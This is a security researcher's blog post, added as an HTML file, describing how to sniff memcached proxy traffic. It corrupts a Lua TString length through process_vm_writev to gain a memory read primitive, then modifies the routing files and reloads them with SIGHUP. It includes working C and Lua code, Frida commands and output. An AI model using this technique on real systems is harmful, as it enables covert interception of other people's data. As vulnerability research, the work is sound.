@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>leveraging Lua to sniff memcached proxies</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>leveraging Lua to sniff memcached proxies</h1>
+			<b><time>2024-08-29</time></b>
+		       
+
+			<div>
+				<p>In early January 2024 I gave a talk at SchmooCon on memcached and some bugs I discovered through fuzzing (<a href="https://github.com/hatRiot/shmoo24-memcached">slides here</a>). Unfortunately, due to the 20 minute slot, I did not have an opportunity to discuss payloads and further post-exploitation activities available to attackers. This post sums up some of those capabilities and includes a few other nuggets for VR/red teaming memcached.</p>
+<p>Mostly, this covers some of the tangential exploit development work I performed on memcached, as well as how we can sniff traffic flowing from the proxy to the data nodes. All relevant code (and slides) can be found on <a href="https://github.com/hatRiot/shmoo24-memcached">Github</a>.</p>
+<p>tl;dr</p>
+<ul>
+<li>memcached uses Lua to handle all proxy routing logic</li>
+<li>I don&rsquo;t want to inject stuff into the process</li>
+<li>we can modify these routing files and hot reload them into memcached</li>
+<li>Lua can&rsquo;t read arbitrary memory, but we can modify certain objects to obtain a partial read/write</li>
+<li>through this read/write primitive, we can sniff request/response data</li>
+</ul>
+<h3 id="brief-recap">brief recap</h3>
+<p>If you didn&rsquo;t see the talk and don&rsquo;t want to read the slides, here&rsquo;s another tl;dr: memcached is a RAM only key-value store used for unstructured data caching with broad enterprise adoption. It speaks three different protocols over three different channels (TCP, UDP, domain) and just barely supports any sort of authn (optional SASL); therefore, if you can hit the memcached port, you can likely access the node. The target of our research was more narrowly focused on the proxy, which is a native, built-in proxy speaking the memcached protocol designed to manage clusters of data nodes. This is a pretty new feature (1.6.13+) and, while it hasn&rsquo;t been as widely deployed as memcached itself, is clearly the performant choice for managing data clusters.</p>
+<p>I fuzzed the proxy node itself and found a few pre-auth memory corruption bugs. The lack of authentication and general flexibility and verbosity of memcached nodes generally means delivery of an exploit implies access to the debug and management functions. These are extremely useful in grooming and inspecting the internal state and, consequently, eases the overall development of a reliable bug.</p>
+<p>With code execution on a proxy node, in addition to gaining access to the server, we&rsquo;ve also gained access to all data flowing through the proxy node; TLS support is experimental and nothing is encrypted at rest. This is probably fine.</p>
+<h3 id="routing">routing</h3>
+<p>I think a quick primer on how routing works is probably useful here. As mentioned, it speaks the memcached protocol, so it&rsquo;s not just a dumb pipe shoveling bits from one end to the other. This fact allows for it to be extremely flexible; it can be configured to route to specific nodes based on certain inputs, commands, or behaviors. Requests can be modified, blocked, or otherwise manipulated entirely before forwarding (or responding).</p>
+<p>Routes and route handling are written in Lua and supported via an embedded Lua interpreter compiled into memcached. Example proxy libraries can be found <a href="https://github.com/memcached/memcached-proxylibs">here</a>, and the <a href="https://github.com/memcached/memcached-proxylibs/tree/main/lib/simple">simple</a> route library is probably the most trivial example for understanding how it functions.</p>
+<p>A route configuration looks something like this (<code>example.lua</code>):</p>
+<pre tabindex="0"><code>package.loaded[&#34;simple&#34;]=nil
+local s = require(&#34;simple&#34;)
+
+pool{
+    name = &#34;foo&#34;,
+    backends = {&#34;127.0.0.1:5444&#34;},
+}
+
+pool{
+    name = &#34;bar&#34;,
+    backends = {&#34;127.0.0.1:5443&#34;},
+}
+</code></pre><p>Which we can run and load using the following: <code>memcached -o proxy_config=example.lua -p11112</code>. This configuration defines two different routes: foo and bar. All requests destined for <code>foo</code> (ie <code>mg /foo/blah v</code>) are routed to the <code>foo</code> backends and all those destined for <code>bar</code> are routed to <code>bar</code> (ie <code>mg /bar/blah v</code>). Definitionally, a pool is a container for backends, and a route is the string path (ie. <code>/bar/blah</code>).</p>
+<p>This is <em>about</em> all the simple routing library provides. It&rsquo;s a very simple (hence&hellip;simple) library that provides the essential &ldquo;hello world&rdquo; of routing via memcached. If we step up to <code>routelib</code>, a <a href="https://github.com/memcached/memcached-proxylibs/tree/main/lib/routelib">more complex router</a>, we unlock additional capabilities, including command-level routing, asynchronous pool support, and more.</p>
+<p>Let&rsquo;s quickly step down one level further to discover how these route libs actually work and interact with memcached. For a variety of performance reasons, as much as possible is performed within the critical path in C, and Lua used exclusively for configuration and processing hooks. The <a href="https://github.com/memcached/memcached/wiki/Proxy">proxy wiki</a> has a great diagram describing how these pools/routes are bootstrapped:</p>
+<figure><img src="/images/posts/2024/memcachedflow.jpg"/>
+</figure>
+
+<p>And:</p>
+<pre tabindex="0"><code>The proxy flow starts by parsing a request (ie: get foo) and looking for a function hook for this command. 
+If a hook exists, it will call the supplied function. If no hook exists, it will handle the request as 
+though it were a normal memcached.
+
+In Lua, this looks like: mcp.attach(mcp.CMD_GET, function) - Functions are objects and can be passed as 
+arguments. The function is called within a coroutine [..]
+</code></pre><p>All of the native Lua code is defined in <a href="https://github.com/memcached/memcached/blob/master/proxy_lua.c"><code>proxy_lua.c</code></a>, which also defines the exported functions available to all route libraries (see <a href="https://github.com/memcached/memcached/blob/master/proxy_lua.c#L1704">here</a>). To demonstrate, lets say whenever a GET request was received we wanted to print out the command. First, we&rsquo;d need to create a generator and attach it to the command:</p>
+<pre tabindex="0"><code>function mcp_config_routes(pool)
+  -- get a new bare object.
+  local fgen = mcp.funcgen_new()
+
+  local handles = {}
+  for _,v in pairs(pool.children) do
+    table.insert(handles, fgen:new_handle(v))
+  end
+
+  -- finalize the function generator object. When we need to create a new
+  -- slot, we will call `route_handler`, which will return a function
+  fgen:ready({ f = route_handler, a = handles })
+
+  -- attach this function generator to `get` commands
+  mcp.attach(mcp.CMD_GET, fgen)
+end
+</code></pre><p>A <code>route_handler</code> then needs to be defined, which will create a function generator that can be executed each time we receive this command:</p>
+<pre tabindex="0"><code>function route_handler(rctx, arg)
+  local handles = arg
+  return function(r)
+
+    -- queue the request into each backend 
+    rctx:enqueue(r, handles)
+    rctx:wait_cond(#handles, mcp.WAIT_ANY)
+    print(&#34;Command: &#34;, r:command())
+
+    -- this is essentially a route_allsync; wait for all responses to complete then return the first error seen.
+    -- If no errors, return the last result
+    for x=1, #handles do
+      local res, mode = rctx:result(handles[x])
+      if mode == mcp.RES_ANY then
+        final = res
+        break
+      else
+        final = res
+      end
+    end
+
+    return final
+  end
+end
+</code></pre><p>The generated route handler will ultimately return a response object: <code>mcp_resp_t</code> in C and <code>userdata</code> in Lua (this is a generic bucket for arbitrary C data). The handler is free to manipulate the response before returning back into memcached. Don&rsquo;t worry if this looks confusingly opaque; the specifics don&rsquo;t matter so much as the gist. Each time we get a request, memcached will invoke our command hook and execute the defined behavior.</p>
+<p>All this is to say, routing is <em>complicated</em> but extremely flexible. Each deployment of a proxy node or routing cluster may look entirely different from another based on the routing library used.</p>
+<h3 id="sniffing">sniffing</h3>
+<p>There are two perspectives we can take to sniffing on the node: that of code executing within the process from, say, a delivered exploit, and that of an attacker on the system with memcached running. The latter is our target consideration for this post, though the former naturally flows from it as consequence.</p>
+<p>The obvious and dumbest way to initially do this is to just <code>tcpdump</code> the proxy port. Like I said, nothing is encrypted in transit by default, and TLS support is <em>experimental</em>, so at this point in time, you&rsquo;re unlikely to actually run into any TLS nodes.</p>
+<p>A second strategy is to inject ourselves into the proxy process and hook from within. This has crossover with the first scenario (a delivered payload) since that simply obviates the need to inject. I found the easiest way to do this is to implement a shared library that hooks <code>read</code> and <code>write</code>, both used when handling TCP connections, then sniffing out the data. We can PoC this using Frida:</p>
+<pre tabindex="0"><code>$ frida-trace -p4686 --decorate -i &#34;read*&#34; -i &#34;write*&#34;
+</code></pre><p>In the above, we&rsquo;re dumping all calls to read/write functions, which memcached&rsquo;s proxy uses to read from the socket. This produces an output as such:</p>
+<pre tabindex="0"><code>  9931 ms  write(fd=0x1, buf=0x7a6b74013010, count=0x11) [libc.so.6]
+  9931 ms  write(fd=0x1, buf=0x7a6b74013010, count=0x26) [libc.so.6]
+  9931 ms  write(fd=0x1, buf=0x7a6b74013010, count=0xa) [libc.so.6]
+ 12686 ms  read(fd=0x33, buf=0x7a6b700248f0, count=0x4000) [libc.so.6]
+ 12686 ms                 0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
+7a6b700248f0  00 00 00 00 00 00 00 00 62 6c 61 68 20 76 0d 0a  ........blah v..
+[..snip..]
+</code></pre><p>There are of course considerations with this strategy: how to inject, how to unload/clean up, and other questions of stabilization. I was ultimately unhappy with this solution as I found it to be inflexible and generally messy.</p>
+<p>Yet a third strategy is to inject ourselves into the routing layer of the proxy node. This is interesting as it doesn&rsquo;t require any special permissions, other than reading/writing the routing files, and we do not need to inject into the running proxy process, therefore we don&rsquo;t need ptrace or elevated privileges. Bringing in our previous understanding of the routing layer, it&rsquo;s easy to assume that we simply modify the routing file to write the request/response data to a file/pipe/whatever and be on our way. Unfortunately, it&rsquo;s not so easy.</p>
+<p>After reviewing the routing library and available functionality, I discovered response data was not accessible via the Lua API. I briefly spoke with maintainers about this, and they stated this was intentional and by design for various performance reasons, but that may change in the future. Let&rsquo;s see what&rsquo;s available to begin with using the provided <a href="https://github.com/memcached/memcached-proxylibs/blob/main/lib/routelib/routelib.lua">routelib</a> as example.</p>
+<p>Requests are handled by a function generator which, in routelib, is denoted by the <code>_f</code> postfix. Some examples would be <code>route_allsync_f</code> and <code>route_zfailover_f</code> and contain the request/response processing logic for <code>allsync</code> and <code>zfailover</code> routes. Each handler has a set of library calls available to it and are defined <a href="https://github.com/memcached/memcached/blob/90f1d91bd0b3048fc2e3dffad8511559568b8ac2/proxy_lua.c#L1704">here</a> (known as <code>mcp</code>).</p>
+<p>With access to the routing library, configuration, and proxy process, but no ability to dump the response from Lua, what can we do? My first thought was to enable access to the response from within the memcached library; unfortunately, this would require us to recompile memcached and reload, far messier than even injecting a shared library. My next thought was reading the response data out of the process itself, but Lua does not have access to arbitrary memory. While LuaJit and some libraries exist to do this, they require reloading the process (in addition to adding artifacts).</p>
+<p>Around the time I was working on this, I found myself reading a <a href="https://www.nccgroup.com/us/research-blog/pumping-iron-on-the-musl-heap-real-world-cve-2022-24834-exploitation-on-an-alpine-mallocng-heap/">post</a> from NCC on exploiting Redis and their exploit just so happened to leverage Lua objects. They overwrote the length of a <code>TString</code> to gain a partial read/write primitive (indexing into the string is unsigned), then elevated to arbitrary through the abuse of a fake <code>Table</code> object. This struck me as particularly convenient in memcached&rsquo;s case, as it could be leveraged by both an attacker delivering an exploit as well as one on system. Unfortunately, in the latter case, it would require elevated privileges on certain systems (reading <code>/proc/pid/</code>). In the end, I put together a proof of concept that enabled this same primitive in memcached&rsquo;s routing layer and used it to sniff the requests/responses as they flowed through the proxy. It&rsquo;s stable, accurate, and low maintanence. It can be trivially hidden, rolled back, modified, and injected without interrupting the proxy.</p>
+<h3 id="sniffing-with-lua">sniffing with Lua</h3>
+<p>In order to enable the address read/write, we need to setup a <code>TString</code> object to corrupt. Lua has two forms of the <code>TString</code>: short and long. They use the same struct typedef, but their fields are interpreted differently based on the type. Short strings have a <a href="https://github.com/lua/lua/blob/master/lstring.h#L29">maximum length</a> of 40, so naturally anything larger constitutes a long string. Since we aim to maximize the length of the field, we&rsquo;ll need to use long strings.</p>
+<p>Since memcached&rsquo;s proxy relies on Lua function generators to produce its route handlers, their execution does not share the same object space as <em>other</em> route handlers. This means we will need to leverage multiple long strings to access each route&rsquo;s request/response object. This turns out to be pretty simple. I modified the <code>route_allsync_f</code> handler with the following:</p>
+<pre tabindex="0"><code>print(string.format(&#34;big string: %p&#34;, BIGSTRING))
+</code></pre><p>And added the following global at the top:</p>
+<pre tabindex="0"><code>BIGSTRING = &#34;CAFEBABE&#34; .. string.rep(&#34;A&#34;, 33)
+</code></pre><p>When I start up the proxy, this produces:</p>
+<pre tabindex="0"><code>big string: 0x71918001fc50
+big string: 0x71918001fc50
+big string: 0x71917801fc50
+big string: 0x71917801fc50
+big string: 0x71917401fc50
+big string: 0x71917401fc50
+big string: 0x71916c01fd60
+big string: 0x71916c01fd60
+</code></pre><p>Great, now we know where our strings are located. The next step is corrupting them. This is pretty easy, but depending on your system configuration, may require elevated privileges to access the process. My strategy here was:</p>
+<ol>
+<li>Read <code>/proc/&lt;pid&gt;/maps</code> to locate all RW non-image backed regions</li>
+<li>Search each of those regions for a magic string (CAFEBABEAA)</li>
+<li>Overwrite each <code>TString</code> length field</li>
+</ol>
+<p>This strategy ensured each instance of the <code>TString</code> for every route handler would be able to read the response data. I&rsquo;ll leave the details of the first two steps to readers of the code, but we&rsquo;ll touch briefly on how we corrupt a <code>TString</code>.</p>
+<p>The struct definition is simple:</p>
+<pre tabindex="0"><code>typedef struct TString {
+  CommonHeader;
+  lu_byte extra;  // reserved words for short strings; &#34;has hash&#34; for longs 
+  ls_byte shrlen;  /* length for short strings, negative for long strings 
+  unsigned int hash;
+  union {
+    size_t lnglen;  /* length for long strings 
+    struct TString *hnext;  /* linked list for hash table 
+  } u;
+  char *contents;  /* pointer to content in long strings 
+  lua_Alloc falloc;  /* deallocation function for external strings 
+  void *ud;  /* user data for external strings 
+} TString;
+</code></pre><p>Since we can allocate a long string, we just need to adjust the <code>lnglen</code> field in order to gain our partial read/write. Here&rsquo;s the code I used to accomplish this:</p>
+<pre tabindex="0"><code>int modify_tstring(pid_t pid, size_t address)
+{
+  size_t nwrite = 0;
+  char MAXLEN[16] = {0xff,0xff,0xff,0x7f,0x0,0x0,0x0,0x0};
+  struct iovec local[1];
+  struct iovec remote[1];
+
+  // update length
+  local[0].iov_base = MAXLEN;
+  local[0].iov_len = 16;
+  remote[0].iov_base = address + (sizeof(int) * 4);
+  remote[0].iov_len = 16;
+
+  nwrite = process_vm_writev(pid, local, 1, remote, 1, 0);
+  if(nwrite &lt;= 0) {
+    printf(&#34;[-] Failed to update lnglen: %s\n&#34;, strerror(errno));
+    return -1;
+  }
+
+  return 0;
+}
+</code></pre><p>And after modifying one, we can confirm:</p>
+<pre tabindex="0"><code>gef➤  p/x *(TString*)0x7898c001fc50
+$2 = {
+  next = 0x7898c001fb80,
+  tt = 0x14,
+  marked = 0x8,
+  extra = 0x0,
+  shrlen = 0x0,
+  hash = 0x37b5b67f,
+  u = {
+    lnglen = 0x7fffffff,
+    hnext = 0x7fffffff
+  },
+  contents = {0x0}
+}
+</code></pre><p>We can then use this and the string&rsquo;s <code>sub</code> function to read out arbitrary bytes of data from memory. In our case the target is the <code>mcp_resp_t</code> object. To do this, we need to figure out where our response object is located in memory. This turns out to be pretty simple in <code>allsync_f</code>, as the entire point of the function is to <em>build</em> the response and return it to C-land for further processing. In this case, it&rsquo;s the <code>final</code> object, and we can fetch its address using the following Lua code:</p>
+<pre tabindex="0"><code>function getaddr(value)
+  return tonumber(string.format(&#34;%p&#34;,value))
+end
+
+getaddr(final)
+</code></pre><p>With this, we calculate the offset between our big string and the response and we&rsquo;re on our way. The response object is a <a href="https://github.com/memcached/memcached/blob/b1aefcdf8a265f8a5126e8aa107a50988fa1ec35/proxy.h#L493">memcached type</a> <code>mcp_resp_t</code> and our response buffer is a pointer. So we&rsquo;ll need to read this address then read the response. This results in the following flow:</p>
+<pre tabindex="0"><code>-- calculate distance between our str and reply
+distance = (getaddr(final)-getaddr(BIGSTRING))-24
+
+-- read address of reply str
+outp = to_bo_hex(BIGSTRING:sub(distance+9, distance+16))
+outp = tonumber(outp,16)
+
+-- read string and dump
+str = (outp-getaddr(BIGSTRING))-23
+
+print(&#34;[+] received allsync request, response:&#34;)
+hexdump(BIGSTRING:sub(str, str+final:vlen()))
+</code></pre><p>You&rsquo;ll notice we offset the distance; this is because <code>BIGSTRING</code> doesn&rsquo;t point to the start of the <code>TString</code> struct, but rather to the value it contains. When indexing, we need to take this into account. Once we edit the route we can force memcached to reload the configuration and routelib by issuing the proxy process a <code>SIGHUP</code>.</p>
+<p>Putting this together, if I send the following commands to the proxy:</p>
+<pre tabindex="0"><code>&gt; mg /foo/blah v
+VA 2
+hi
+
+&gt; mg /foo/test v
+VA 4
+test
+</code></pre><p>I see the following on the proxy server:</p>
+<pre tabindex="0"><code>[+] received allsync request, response:
+68 69 0d
+[+] received allsync request, response:
+74 65 73 74 0d
+</code></pre><p>I opted to retain the hexdump for response data as we&rsquo;ll traditionally get packed data back. This proves to be very accurate and stable, and flexible across any routes, or even routelibs, used on target systems. Additionally, though I only demonstrated access via to the meta-get command response, it trivially supports others.</p>
+<h3 id="the-end">the end</h3>
+<p>This whole thing might some day be for nought, as the memcached maintainers have expressed interest in adding the response data to Lua land. In that case, our method becomes trivial: modify the routelib to dump the response, SIGHUP the proxy process, and harvest data. I think that the primitives available here are still useful outside the context of memcached&rsquo;s current state, such as the weaponization of memory corruption bugs in the proxy (such as <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46852">CVE-2023-46852</a>) or abuse through debug commands.</p>
+<p>As always, the code is available on Github <a href="https://github.com/hatRiot/shmoo24-memcached">here</a>.</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/leveraging-lua-to-sniff-memcached-proxies/">leveraging Lua to sniff memcached proxies</a></li>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
